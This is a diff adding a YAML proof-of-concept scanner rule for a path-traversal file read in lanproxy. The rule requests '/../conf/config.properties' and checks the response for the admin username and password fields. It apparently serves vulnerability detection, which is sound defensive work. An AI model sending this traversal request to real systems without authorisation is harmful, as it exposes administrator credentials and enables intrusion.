@@ -1,0 +1,12 @@
+name: poc-yaml-lanproxy-lfi
+
+rules:
+  - method: GET
+    path: "/../conf/config.properties"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(b"config.admin.username"))) && response.body.bcontains(bytes(string(b"config.admin.password")))
+detail:
+  author: pa55w0rd(www.pa55w0rd.online/)
+  Affected Version: "https://github.com/ffay/lanproxy"
+  links:
+    - https://github.com/ffay/lanproxy/issues/152
